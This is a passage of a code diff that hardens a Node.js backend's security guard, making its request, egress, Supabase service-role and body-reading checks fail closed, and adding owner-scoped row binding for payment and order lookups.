   const __diracCentralPreviousReadBodyV146 = typeof readBody === 'function' ? readBody : null;
@@ -25602,7 +33288,7 @@ try {
     };
     Object.defineProperty(readBody, '__diracCentralBodyCacheV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV107ShouldSkipV146 = typeof diracV107ShouldSkip === 'function' ? diracV107ShouldSkip : null;
@@ -25612,7 +33298,7 @@ try {
     };
     Object.defineProperty(diracV107ShouldSkip, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV143ThreatV146 = typeof diracV143DetectRequestThreat === 'function' ? diracV143DetectRequestThreat : null;
@@ -25622,7 +33308,7 @@ try {
     };
     Object.defineProperty(diracV143DetectRequestThreat, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousV143InspectOwnershipV146 = typeof diracV143InspectOwnership === 'function' ? diracV143InspectOwnership : null;
@@ -25632,13 +33318,14 @@ try {
     };
     Object.defineProperty(diracV143InspectOwnership, '__diracCentralPassthroughV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 
 try {
   const __diracCentralPreviousSupabaseFetchV146 = typeof supabaseFetch === 'function' ? supabaseFetch : null;
+  if (!__diracCentralPreviousSupabaseFetchV146) throw new Error('DIRAC_CENTRAL_SUPABASE_FETCH_MISSING');
   if (__diracCentralPreviousSupabaseFetchV146 && !__diracCentralPreviousSupabaseFetchV146.__diracCentralServiceRoleV146) {
     supabaseFetch = async function supabaseFetchCentralServiceRoleGuardV146(path, options = {}) {
-      const decision = await diracCentralInspectServiceRoleAccessV146(path, options).catch(() => ({ ok: true }));
+      const decision = await diracCentralInspectServiceRoleAccessV146(path, options).catch(() => ({ block: true, reason: 'service_role_guard_exception', status: 503 }));
       if (decision && decision.block) return diracCentralBlockedSupabaseResultV146(decision);
       const ctx = diracCentralCurrentContextV149();
       const requestCacheKey = ctx ? diracCentralSupabaseRequestCacheKeyV151(path, options) : '';
@@ -25648,6 +33335,7 @@ try {
         const cachedPromise = ctx.__diracCentralSupabaseRequestCacheV151.get(requestCacheKey);
         if (cachedPromise) {
           const cachedResult = await cachedPromise;
+          diracCentralBindOwnerScopedSessionRowsV197(ctx, path, options, cachedResult);
           return diracCentralCloneSupabaseResultV151(cachedResult);
         }
 
@@ -25655,18 +33343,19 @@ try {
         const fetchPromise = __diracCentralPreviousSupabaseFetchV146(path, options)
           .then((result) => {
             if (!result || result.ok !== true) {
-              try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (_) {}
+              try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
             }
             return diracCentralCloneSupabaseResultV151(result);
           })
           .catch((error) => {
-            try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (_) {}
+            try { ctx.__diracCentralSupabaseRequestCacheV151.delete(requestCacheKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
             throw error;
           });
 
         ctx.__diracCentralSupabaseRequestCacheV151.set(requestCacheKey, fetchPromise);
         try {
           const result = await fetchPromise;
+          diracCentralBindOwnerScopedSessionRowsV197(ctx, path, options, result);
           return diracCentralCloneSupabaseResultV151(result);
         } finally {
           if (ctx) ctx.__diracCentralSafeServiceRoleFetchV146 = false;
@@ -25675,20 +33364,25 @@ try {
 
       if (ctx && options && options.auth === 'service') ctx.__diracCentralSafeServiceRoleFetchV146 = true;
       try {
-        return await __diracCentralPreviousSupabaseFetchV146(path, options);
+        const result = await __diracCentralPreviousSupabaseFetchV146(path, options);
+        diracCentralBindOwnerScopedSessionRowsV197(ctx, path, options, result);
+        return result;
       } finally {
         if (ctx) ctx.__diracCentralSafeServiceRoleFetchV146 = false;
       }
     };
     Object.defineProperty(supabaseFetch, '__diracCentralServiceRoleV146', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (error) {
+  throw new Error('DIRAC_CENTRAL_SERVICE_ROLE_GUARD_INSTALL_FAILED', { cause: error });
+}
 
 try {
   const __diracCentralPreviousFetchV146 = typeof globalThis.fetch === 'function' ? globalThis.fetch.bind(globalThis) : null;
+  if (!__diracCentralPreviousFetchV146) throw new Error('DIRAC_CENTRAL_GLOBAL_FETCH_MISSING');
   if (__diracCentralPreviousFetchV146 && !globalThis.__DIRAC_CENTRAL_FETCH_EGRESS_WRAPPED_V146__) {
     globalThis.fetch = async function fetchCentralEgressGuardV146(input, options) {
-      const decision = await diracCentralInspectEgressV146(input, options).catch(() => ({ ok: true }));
+      const decision = await diracCentralInspectEgressV146(input, options).catch(() => ({ block: true, reason: 'egress_guard_exception' }));
       if (decision && decision.block) {
         const error = new Error('DIRAC_EGRESS_BLOCKED');
         error.code = 'DIRAC_EGRESS_BLOCKED';
@@ -25699,17 +33393,171 @@ try {
     };
     globalThis.__DIRAC_CENTRAL_FETCH_EGRESS_WRAPPED_V146__ = true;
   }
-} catch (_) {}
+} catch (error) {
+  throw new Error('DIRAC_CENTRAL_EGRESS_GUARD_INSTALL_FAILED', { cause: error });
+}
 
+
+/* v221 final body-reader seal: installed after every legacy body wrapper. */
 try {
-  const __diracCentralPreviousHandlerV146 = module.exports;
-  if (typeof __diracCentralPreviousHandlerV146 === 'function' && !__diracCentralPreviousHandlerV146.__diracCentralSecurityGuardV146) {
-    module.exports = async function diracCentralSecurityGuardWrapperV146(req, res) {
-      return diracCentralRunWithAsyncContextV149(() => diracCentralSecurityGuardV146(req, res, __diracCentralPreviousHandlerV146));
+  const __diracCentralFinalReadLimitedJsonBodyV221 = typeof readLimitedJsonBody === 'function' ? readLimitedJsonBody : null;
+  if (!__diracCentralFinalReadLimitedJsonBodyV221) throw new Error('DIRAC_V221_FINAL_BODY_READER_MISSING');
+  if (!__diracCentralFinalReadLimitedJsonBodyV221.__diracCentralRawJsonV221) {
+    readLimitedJsonBody = async function readLimitedJsonBodyFinalSealV221(req, limitBytes) {
+      const limit = Math.max(1024, Number(limitBytes || LOGIN_SECURITY_BODY_LIMIT_BYTES || 16 * 1024));
+      if (req && Buffer.isBuffer(req.body)) req.body = req.body.toString('utf8');
+      if (req && req.body === undefined && typeof req.on === 'function') {
+        if (req.readableEnded) {
+          req.body = '';
+        } else {
+          req.body = await new Promise((resolve, reject) => {
+            const chunks = [];
+            let total = 0;
+            let completed = false;
+            const fail = (error) => {
+              if (completed) return;
+              completed = true;
+              reject(error);
+            };
+            req.on('data', (chunk) => {
+              if (completed) return;
+              const buffer = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
+              total += buffer.length;
+              if (total > limit) {
+                const error = new Error('BODY_TOO_LARGE');
+                error.statusCode = 413;
+                error.code = 'BODY_TOO_LARGE';
+                fail(error);
+                return;
+              }
+              chunks.push(buffer);
+            });
+            req.on('end', () => {
+              if (completed) return;
+              completed = true;
+              resolve(Buffer.concat(chunks).toString('utf8'));
+            });
+            req.on('error', fail);
+            req.on('aborted', () => {
+              const error = new Error('BODY_ABORTED');
+              error.code = 'BODY_ABORTED';
+              fail(error);
+            });
+          });
+        }
+      }
+      if (req && typeof req.body === 'string') {
+        if (Buffer.byteLength(req.body, 'utf8') > limit) {
+          const error = new Error('BODY_TOO_LARGE');
+          error.statusCode = 413;
+          error.code = 'BODY_TOO_LARGE';
+          throw error;
+        }
+        const verifiedRawBodyBufferV230 = Buffer.from(req.body, 'utf8');
+        const verifiedRawBodySha256V230 = crypto
+          .createHash('sha256')
+          .update(verifiedRawBodyBufferV230)
+          .digest('hex');
+
+        const sealedRawJsonDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawJsonV221');
+        const sealedRawBufferDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawBodyBufferV230');
+        const sealedRawLengthDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawBodyLengthV230');
+        const sealedRawHashDescriptorV230 =
+          Object.getOwnPropertyDescriptor(req, '__diracRawBodySha256V230');
+
+        const sealedRawBodyBufferV230 = req.__diracRawBodyBufferV230;
+
+        const rawEvidenceValidV230 =
+          sealedRawJsonDescriptorV230 &&
+          sealedRawJsonDescriptorV230.writable === false &&
+          sealedRawJsonDescriptorV230.configurable === false &&
+          sealedRawJsonDescriptorV230.enumerable === false &&
+          typeof sealedRawJsonDescriptorV230.value === 'string' &&
+          sealedRawJsonDescriptorV230.value === req.body &&
+
+          sealedRawBufferDescriptorV230 &&
+          sealedRawBufferDescriptorV230.writable === false &&
+          sealedRawBufferDescriptorV230.configurable === false &&
+          sealedRawBufferDescriptorV230.enumerable === false &&
+          (Buffer.isBuffer(sealedRawBodyBufferV230) ||
+            sealedRawBodyBufferV230 instanceof Uint8Array) &&
+          Buffer.from(sealedRawBodyBufferV230).equals(verifiedRawBodyBufferV230) &&
+
+          sealedRawLengthDescriptorV230 &&
+          sealedRawLengthDescriptorV230.writable === false &&
+          sealedRawLengthDescriptorV230.configurable === false &&
+          sealedRawLengthDescriptorV230.enumerable === false &&
+          Number.isSafeInteger(Number(sealedRawLengthDescriptorV230.value)) &&
+          Number(sealedRawLengthDescriptorV230.value) ===
+            verifiedRawBodyBufferV230.length &&
+
+          sealedRawHashDescriptorV230 &&
+          sealedRawHashDescriptorV230.writable === false &&
+          sealedRawHashDescriptorV230.configurable === false &&
+          sealedRawHashDescriptorV230.enumerable === false &&
+          /^[a-f0-9]{64}$/.test(String(sealedRawHashDescriptorV230.value)) &&
+          String(sealedRawHashDescriptorV230.value) ===
+            verifiedRawBodySha256V230;
+
+        if (!rawEvidenceValidV230) {
+          const error = new Error('RAW_BODY_EVIDENCE_MISMATCH');
+          error.statusCode = 400;
+          error.code = 'RAW_BODY_EVIDENCE_MISMATCH';
+          throw error;
+        }
+        const scan = diracCentralJsonDuplicateScanV221(req.body || '{}');
+        if (scan.duplicate) {
+          req.__diracRawJsonDuplicateV221 = scan.key || 'duplicate';
+          const error = new Error('DUPLICATE_JSON_KEY');
+          error.statusCode = 400;
+          error.code = 'DUPLICATE_JSON_KEY';
+          throw error;
+        }
+        if (scan.malformed) req.__diracRawJsonMalformedV221 = scan.reason || 'malformed';
+      }
+      return __diracCentralFinalReadLimitedJsonBodyV221(req, limit);
     };
-    Object.defineProperty(module.exports, '__diracCentralSecurityGuardV146', { value: true, enumerable: false });
+    Object.defineProperty(readLimitedJsonBody, '__diracCentralRawJsonV221', { value: true, enumerable: false });
+    Object.defineProperty(readLimitedJsonBody, '__diracCentralFinalSealV221', { value: true, enumerable: false });
   }
-} catch (_) {}
+} catch (error) {
+  throw new Error('DIRAC_V221_FINAL_BODY_READER_INSTALL_FAILED', { cause: error });
+}
+
+const __diracV202CentralGuardHandler = async function diracCentralSecurityGuardWrapperV146(req, res, nextHandlerV202) {
+  try {
+    return await diracCentralRunWithAsyncContextV149(() => diracCentralSecurityGuardV146(req, res, nextHandlerV202));
+  } catch (error) {
+    let emergencyRequestId = '';
+    try { emergencyRequestId = crypto.randomBytes(16).toString('hex'); }
+    catch (_) { emergencyRequestId = String(Date.now()) + '-' + String(process && process.pid || 0); }
+    const emergencyCtx = {
+      req, res, requestId: emergencyRequestId,
+      rawAction: '', action: '', method: '', passport: 0n,
+      guardPassport: Object.create(null), stageTraceV211: [],
+      executionPhaseV211: 'emergency_fail_closed',
+      currentStageV211: 'central_guard_bootstrap', currentStageIndexV211: -1,
+      failedStageV211: 'central_guard_bootstrap',
+      failureReasonV211: String(error && error.code || error && error.message || 'central_guard_bootstrap_exception').slice(0, 120),
+      centralGuardFullyPassedV211: false
+    };
+    try {
+      DIRAC_CENTRAL_CONTEXT_STACK_V146.push(emergencyCtx);
+      diracCentralSetCurrentContextV149(emergencyCtx);
+      emergencyCtx.centralErrorDebugV155 = diracCentralSafeDebugErrorV155(error, emergencyCtx);
+      diracCentralEmitDebugV211(emergencyCtx, 'central_bootstrap_exception', emergencyCtx.centralErrorDebugV155);
+      return diracCentralPersistenceUnavailableResponseV210(res);
+    } finally {
+      const index = DIRAC_CENTRAL_CONTEXT_STACK_V146.indexOf(emergencyCtx);
+      if (index >= 0) DIRAC_CENTRAL_CONTEXT_STACK_V146.splice(index, 1);
+      diracCentralSetCurrentContextV149(null);
+    }
+  }
+};
+__diracV202MarkWrapperFlag('__diracCentralSecurityGuardV146');
 
 
 function diracCentralSupabaseRequestCacheKeyV151(path, options = {}) {
@@ -25731,6 +33579,223 @@ function diracCentralIsRequestCacheableSupabaseReadV151(path) {
     || /^\/rest\/v1\/security_customer_sessions(?:$|[?#])/.test(value)
     || /^\/rest\/v1\/products(?:$|[?#])/.test(value)
     || /^\/rest\/v1\/domain_tld_prices(?:$|[?#])/.test(value);
+}
+
+
+// PATCH v198: bind only row IDs returned by an owner-scoped service-role GET
+// in the same fully guarded request. Existing session read-then-update remains
+// unchanged. my_orders may additionally bind only orders/domain_orders rows
+// whose returned customer_id matches the already-approved customer_id filter.
+function diracCentralBindOwnerScopedSessionRowsV197(ctx, path, options = {}, result) {
+  try {
+    if (!ctx || !ctx.req || ctx.req.__diracCentralSecurityGuardPassedV146 !== true) return false;
+    if (!ctx.action || !options || options.auth !== 'service') return false;
+    if (!result || result.ok !== true) return false;
+
+    const method = String(options.method || 'GET').toUpperCase();
+    const table = diracCentralExtractRestTableV146(path);
+    const rawPath = String(path || '');
+    const queryIndex = rawPath.indexOf('?');
+    if (queryIndex < 0) {
+      if (rawPath !== '/rest/v1/' + table) return false;
+    } else if (queryIndex === 0 || rawPath.slice(0, queryIndex) !== '/rest/v1/' + table) {
+      return false;
+    }
+
+    // A transaction ID may be bound only after the exact owner/order-bound
+    // create_payment insert contract succeeds and Supabase returns one UUID.
+    if (String(ctx.action || '').trim().toLowerCase() === 'create_payment'
+        && table === 'payment_transactions' && method === 'POST') {
+      if (!diracCentralIsCreatePaymentTransactionServiceRoleV199(ctx, table, path, options, method)) return false;
+      const rows = Array.isArray(result.data) ? result.data : [result.data];
+      if (rows.length !== 1) return false;
+      const transactionId = String(rows[0] && rows[0].id || '').trim();
+      if (!diracCentralLooksLikeUuidV146(transactionId)) return false;
+      return diracCentralAddOwnerBoundObjectValuesV198(ctx, [transactionId]);
+    }
+
+    if (method !== 'GET') return false;
+    if (!Array.isArray(result.data) || result.data.length > 100) return false;
+    if (options.body !== undefined && options.body !== null) return false;
+    if (queryIndex <= 0) return false;
+    const params = new URLSearchParams(rawPath.slice(queryIndex + 1));
+
+    if (table === 'security_customer_sessions') {
+      if (params.getAll('customer_id').length !== 1 || params.has('id')) return false;
+      const customerFilter = String(params.get('customer_id') || '');
+      if (!customerFilter.startsWith('eq.')) return false;
+      const customerId = customerFilter.slice(3).trim();
+      if (!diracCentralLooksLikeUuidV146(customerId)) return false;
+
+      const scope = diracCentralExtractServiceRoleScopeIdsV146(path, null);
+      if (scope.customerIds.length !== 1 || scope.customerIds[0] !== customerId) return false;
+      if (scope.authUserIds.length || scope.userIds.length || scope.objectValues.length) return false;
+
+      const rowIds = result.data
+        .map((row) => String(row && row.id || '').trim())
+        .filter((value) => diracCentralLooksLikeUuidV146(value));
+      if (!rowIds.length || rowIds.length !== result.data.length) return false;
+      return diracCentralAddOwnerBoundObjectValuesV198(ctx, rowIds);
+    }
+
+    const action = String(ctx.action || '').trim().toLowerCase();
+    if (action === 'create_payment') {
+      if (String(ctx.method || '').trim().toUpperCase() !== 'POST') return false;
+      if (table !== 'orders' && table !== 'domain_orders') return false;
+
+      const ownerCustomerId = String(ctx.__diracCentralCheckoutOwnerCustomerIdV196 || '').trim();
+      if (!diracCentralLooksLikeUuidV146(ownerCustomerId)) return false;
+      if (params.getAll('customer_id').length !== 1) return false;
+      const customerFilter = String(params.get('customer_id') || '');
+      if (customerFilter !== 'eq.' + ownerCustomerId) return false;
+
+      const body = ctx.body && typeof ctx.body === 'object' ? ctx.body : {};
+      const query = ctx.req && ctx.req.query && typeof ctx.req.query === 'object' ? ctx.req.query : {};
+      const requested = String(
+        body.order_id || body.orderId || body.order_code || body.orderCode || body.invoice_code || body.invoiceCode || body.id ||
+        query.order_id || query.orderId || query.order_code || query.orderCode || query.invoice_code || query.invoiceCode || query.id || ''
+      ).trim().replace(/[\u0000-\u001f\u007f]/g, '').slice(0, 140);
+      if (!requested) return false;
+
+      if (table === 'orders') {
+        const allowedKeys = new Set(['select', 'customer_id', 'or', 'limit']);
+        if (Array.from(params.keys()).length !== 4
+            || Array.from(params.keys()).some((key) => !allowedKeys.has(String(key || '').toLowerCase()))) return false;
+        if (Array.from(allowedKeys).some((key) => params.getAll(key).length !== 1)) return false;
+        const expectedSelect = 'id,order_id,customer_id,customer_name,customer_email,customer_phone,service_type,subtotal,total,payment_method,payment_status,order_status,created_at';
+        if (params.get('select') !== expectedSelect || params.get('limit') !== '1') return false;
+        if (!/^\((?:id|order_id)\.eq\.[^,()]+(?:,(?:id|order_id)\.eq\.[^,()]+)?\)$/.test(String(params.get('or') || ''))) return false;
+        if (result.data.length !== 1) return false;
+        const row = result.data[0];
+        const rowId = String(row && row.id || '').trim();
+        const rowOrderCode = String(row && row.order_id || '').trim();
+        const rowCustomerId = String(row && row.customer_id || '').trim();
+        if (!diracCentralLooksLikeUuidV146(rowId) || rowCustomerId !== ownerCustomerId) return false;
+        if (requested !== rowId && requested !== rowOrderCode) return false;
+        const expectedAmount = typeof lockedPaymentMoney === 'function'
+          ? lockedPaymentMoney(row && (row.total ?? row.subtotal ?? 0))
+          : Number(row && (row.total ?? row.subtotal ?? 0));
+        const expectedServiceType = typeof lockedPaymentNormalizeServiceType === 'function'
+          ? lockedPaymentNormalizeServiceType(row && row.service_type || 'order')
+          : String(row && row.service_type || 'order').trim().toLowerCase();
+        const expectedOrderCode = typeof lockedPaymentCleanText === 'function'
+          ? lockedPaymentCleanText(rowOrderCode || rowId, 100)
+          : String(rowOrderCode || rowId).trim().slice(0, 100);
+        if (!Number.isFinite(expectedAmount) || expectedAmount <= 0 || !expectedServiceType || !expectedOrderCode) return false;
+        ctx.__diracCentralCreatePaymentExpectedV199 = {
+          kind: 'regular', customerId: ownerCustomerId, objectId: rowId,
+          amount: expectedAmount, serviceType: expectedServiceType,
+          orderCode: expectedOrderCode, amountSource: 'orders.total.database'
+        };
+        return diracCentralAddOwnerBoundObjectValuesV198(ctx, [rowId]);
+      }
+
+      const expectedSelect = 'id,customer_id,customer_name,customer_whatsapp,customer_email,owner_email,domain_name,total_price,currency,order_status,status,payment_status,created_at';
+      if (params.getAll('select').length !== 1 || params.get('select') !== expectedSelect) return false;
+      const candidate = requested.replace(/^DOM-/i, '');
+
+      if (params.has('or')) {
+        const allowedKeys = new Set(['select', 'customer_id', 'or', 'limit']);
+        if (Array.from(params.keys()).length !== 4
+            || Array.from(params.keys()).some((key) => !allowedKeys.has(String(key || '').toLowerCase()))) return false;
+        if (Array.from(allowedKeys).some((key) => params.getAll(key).length !== 1)) return false;
+        if (params.get('limit') !== '1' || !/^\(id\.eq\.[^,()]+(?:,id\.eq\.[^,()]+)?\)$/.test(String(params.get('or') || ''))) return false;
+        if (result.data.length !== 1) return false;
+        const row = result.data[0];
+        const rowId = String(row && row.id || '').trim();
+        if (!diracCentralLooksLikeUuidV146(rowId) || String(row && row.customer_id || '').trim() !== ownerCustomerId) return false;
+        if (rowId !== requested && rowId !== candidate) return false;
+        const expectedAmount = typeof lockedPaymentMoney === 'function'
+          ? lockedPaymentMoney(row && row.total_price || 0)
+          : Number(row && row.total_price || 0);
+        if (!Number.isFinite(expectedAmount) || expectedAmount <= 0) return false;
+        ctx.__diracCentralCreatePaymentExpectedV199 = {
+          kind: 'domain', customerId: ownerCustomerId, objectId: rowId,
+          amount: expectedAmount, serviceType: 'domain',
+          orderCode: 'DOM-' + rowId.slice(0, 8).toUpperCase(),
+          amountSource: 'domain_orders.total_price.database'
+        };
+        return diracCentralAddOwnerBoundObjectValuesV198(ctx, [rowId]);
+      }
+
+      const allowedKeys = new Set(['select', 'customer_id', 'order', 'limit']);
+      if (Array.from(params.keys()).length !== 4
+          || Array.from(params.keys()).some((key) => !allowedKeys.has(String(key || '').toLowerCase()))) return false;
+      if (Array.from(allowedKeys).some((key) => params.getAll(key).length !== 1)) return false;
+      if (params.get('order') !== 'created_at.desc' || params.get('limit') !== '100') return false;
+      if (!/^DOM-[A-F0-9]{8}$/i.test(requested)) return false;
+      const prefix = requested.slice(4).toLowerCase();
+      const matching = result.data.filter((row) => {
+        const rowId = String(row && row.id || '').trim();
+        return diracCentralLooksLikeUuidV146(rowId)
+          && String(row && row.customer_id || '').trim() === ownerCustomerId
+          && rowId.toLowerCase().startsWith(prefix);
+      });
+      if (matching.length !== 1) return false;
+      const matchedRow = matching[0];
+      const matchedId = String(matchedRow && matchedRow.id || '').trim();
+      const expectedAmount = typeof lockedPaymentMoney === 'function'
+        ? lockedPaymentMoney(matchedRow && matchedRow.total_price || 0)
+        : Number(matchedRow && matchedRow.total_price || 0);
+      if (!Number.isFinite(expectedAmount) || expectedAmount <= 0) return false;
+      ctx.__diracCentralCreatePaymentExpectedV199 = {
+        kind: 'domain', customerId: ownerCustomerId, objectId: matchedId,
+        amount: expectedAmount, serviceType: 'domain',
+        orderCode: 'DOM-' + matchedId.slice(0, 8).toUpperCase(),
+        amountSource: 'domain_orders.total_price.database'
+      };
+      return diracCentralAddOwnerBoundObjectValuesV198(ctx, [matchedId]);
+    }
+
+    if (action !== 'my_orders') return false;
+    if (String(ctx.method || '').trim().toUpperCase() !== 'GET') return false;
+    if (table !== 'orders' && table !== 'domain_orders') return false;
+    if (result.data.length > 80) return false;
+
+    const allowedKeys = new Set(['select', 'customer_id', 'order', 'limit']);
+    if (Array.from(params.keys()).some((key) => !allowedKeys.has(String(key || '').toLowerCase()))) return false;
+    if (params.getAll('select').length !== 1 || params.getAll('customer_id').length !== 1
+      || params.getAll('order').length !== 1 || params.getAll('limit').length !== 1) return false;
+    if (params.get('order') !== 'created_at.desc' || params.get('limit') !== '80') return false;
+
+    const expectedSelect = table === 'orders'
+      ? 'id,order_id,customer_id,customer_name,customer_email,customer_phone,service_type,subtotal,total,payment_method,payment_status,order_status,created_at'
+      : 'id,customer_id,customer_name,customer_whatsapp,customer_email,owner_email,dns_method,target_platform,domain_name,total_price,currency,order_status,status,payment_status,created_at';
+    if (params.get('select') !== expectedSelect) return false;
+
+    const customerFilter = String(params.get('customer_id') || '');
+    if (!customerFilter.startsWith('in.(') || !customerFilter.endsWith(')')) return false;
+    const scope = diracCentralExtractServiceRoleScopeIdsV146(path, null);
+    if (!scope.customerIds.length || scope.customerIds.length > 40) return false;
+    if (scope.authUserIds.length || scope.userIds.length || scope.objectValues.length) return false;
+    const approvedCustomers = new Set(scope.customerIds);
+
+    const rowIds = [];
+    for (const row of result.data) {
+      const rowId = String(row && row.id || '').trim();
+      const rowCustomerId = String(row && row.customer_id || '').trim();
+      if (!diracCentralLooksLikeUuidV146(rowId) || !approvedCustomers.has(rowCustomerId)) return false;
+      rowIds.push(rowId);
+    }
+    if (!rowIds.length) return false;
+    return diracCentralAddOwnerBoundObjectValuesV198(ctx, rowIds);
+  } catch (_) {
+    return false;
+  }
+}
+
+function diracCentralAddOwnerBoundObjectValuesV198(ctx, values) {
+  const cleanValues = Array.from(new Set((values || []).map((value) => String(value || '').trim())
+    .filter((value) => diracCentralLooksLikeUuidV146(value))));
+  if (!ctx || !cleanValues.length) return false;
+  const bound = ctx.__diracCentralOwnerBoundObjectValuesV194 instanceof Set
+    ? ctx.__diracCentralOwnerBoundObjectValuesV194
+    : new Set();
+  const newValues = cleanValues.filter((value) => !bound.has(value));
+  if (bound.size + newValues.length > 200) return false;
+  newValues.forEach((value) => bound.add(value));
+  ctx.__diracCentralOwnerBoundObjectValuesV194 = bound;
+  return true;
 }
 
 function diracCentralCloneSupabaseResultV151(result) {
@@ -25761,183 +33826,177 @@ function diracCentralSetCurrentContextV149(ctx) {
   try {
     const store = DIRAC_CENTRAL_ASYNC_CONTEXT_V149 && DIRAC_CENTRAL_ASYNC_CONTEXT_V149.getStore();
     if (store) store.ctx = ctx || null;
-  } catch (_) {}
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 }
 
 function diracCentralCurrentContextV149() {
   try {
-    const store = DIRAC_CENTRAL_ASYNC_CONTEXT_V149 && DIRAC_CENTRAL_ASYNC_CONTEXT_V149.getStore();
-    if (store && store.ctx) return store.ctx;
-  } catch (_) {}
-  return DIRAC_CENTRAL_CONTEXT_STACK_V146[DIRAC_CENTRAL_CONTEXT_STACK_V146.length - 1];
+    if (DIRAC_CENTRAL_ASYNC_CONTEXT_V149) {
+      const store = DIRAC_CENTRAL_ASYNC_CONTEXT_V149.getStore();
+      if (store) return store.ctx || null;
+    }
+  } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  return DIRAC_CENTRAL_CONTEXT_STACK_V146[DIRAC_CENTRAL_CONTEXT_STACK_V146.length - 1] || null;
 }
 
 async function diracCentralSecurityGuardV146(req, res, nextHandler) {
   const method = String(req && req.method || 'GET').toUpperCase();
-  let ctx = null;
+  const rawHeaders = req && req.headers && typeof req.headers === 'object' ? req.headers : {};
+  const normalizedHeaders = Object.create(null);
+  for (const [key, value] of Object.entries(rawHeaders)) normalizedHeaders[String(key).toLowerCase()] = value;
+  let ctx = {
+    req,
+    res,
+    requestId: crypto.randomBytes(16).toString('hex'),
+    rawAction: String(req && req.query && req.query.action || ''),
+    action: '',
+    method,
+    origin: String(normalizedHeaders.origin || ''),
+    headers: Object.freeze(normalizedHeaders),
+    clientIpHash: '',
+    userAgentHash: '',
+    body: null,
+    bodyHash: '',
+    customerId: '',
+    sessionId: '',
+    deviceId: '',
+    policy: null,
+    ownership: null,
+    authentication: null,
+    identity: null,
+    classification: '',
+    passport: 0n,
+    requiredPassport: DIRAC_V202_PRE_INTEGRITY_CHECKPOINTS,
+    guardPassport: Object.create(null),
+    guardDecisions: Object.create(null),
+    audit: [],
+    startedAt: Date.now(),
+    skipHeavyScan: false,
+    sample: null,
+    terminalResponse: '',
+    terminalBlockReason: '',
+    executionPhaseV211: 'guard',
+    currentStageV211: '',
+    currentStageIndexV211: -1,
+    failedStageV211: '',
+    failureReasonV211: '',
+    stageTraceV211: [],
+    centralGuardFullyPassedV211: false,
+    ownerResolutionDebugV212: null,
+    serviceRoleDebugV212: null,
+    ownerBootstrapDebugV213: null,
+    preflightValidatedV221: false,
+    failureClassificationV221: null,
+    threatEvidenceV221: null,
+    mfaVerifiedV221: false
+  };
   try {
-    diracCentralApplyHeadersV146(res);
-    diracCentralWrapJsonResponseV146(res);
-
-    const identity = await diracCentralBuildIdentityV146(req);
-    ctx = {
-      req,
-      res,
-      method,
-      identity,
-      action: '',
-      classification: '',
-      startedAt: Date.now(),
-      skipHeavyScan: false,
-      body: null,
-      sample: null,
-      guardPassport: Object.create(null)
-    };
     DIRAC_CENTRAL_CONTEXT_STACK_V146.push(ctx);
     diracCentralSetCurrentContextV149(ctx);
 
-    const memoryBan = diracCentralCheckMemoryBanV146(identity);
-    if (memoryBan.blocked) return diracCentralBlockedResponseV146(res, 'MEMORY_BAN_ACTIVE');
-    diracCentralStampV146(ctx, 'identity_checked');
-    diracCentralStampV146(ctx, 'memory_ban_checked');
-
-    const persistentBan = await diracCentralCheckPersistentBanV146(req, identity);
-    if (persistentBan.blocked) {
-      diracCentralSetMemoryBanV146(identity, persistentBan.blockedUntilMs, 'persistent_ban');
-      return diracCentralBlockedResponseV146(res, 'PERSISTENT_BAN_ACTIVE');
-    }
-    diracCentralStampV146(ctx, 'persistent_ban_checked');
-    diracCentralSetNegativeCacheV146(identity);
-
-    const rawAction = String(req && req.query && req.query.action || '');
-    const lowerAction = rawAction.toLowerCase();
-    const format = diracCentralValidateActionFormatV146(rawAction, lowerAction);
-    if (!format.ok) return await diracCentralBanAndBlockV146(req, res, ctx, lowerAction || 'missing_action', method, format.reason);
-    diracCentralStampV146(ctx, 'action_format_checked');
-
-    const aliasResult = diracCentralNormalizeAliasV146(lowerAction);
-    if (!aliasResult.ok) return await diracCentralBanAndBlockV146(req, res, ctx, lowerAction, method, aliasResult.reason);
-    diracCentralStampV146(ctx, 'alias_checked');
-
-    const action = aliasResult.action;
-    ctx.action = action;
-    ctx.isA2FAction = diracCentralIsA2FActionV148(action);
-    if (req && req.query) req.query.action = action;
-
-    if (!DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(action) && !DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(action)) {
-      return await diracCentralBanAndBlockV146(req, res, ctx, action, method, 'action_not_in_global_whitelist');
-    }
-    diracCentralStampV146(ctx, 'whitelist_checked');
-
-    if (DIRAC_CENTRAL_DISABLED_ACTIONS_V146.has(action)) {
-      return diracCentralDisabledResponseV146(res);
-    }
-
-    const vercel2OnlyGuard = diracCentralVercel2OnlyActionGuardV150(action);
-    if (!vercel2OnlyGuard.ok) return await diracCentralBanAndBlockV146(req, res, ctx, action, method, vercel2OnlyGuard.reason);
-    diracCentralStampV146(ctx, 'vercel2_action_checked');
-
-    ctx.classification = diracCentralClassifyActionV146(action);
-    diracCentralStampV146(ctx, 'classification_checked');
-
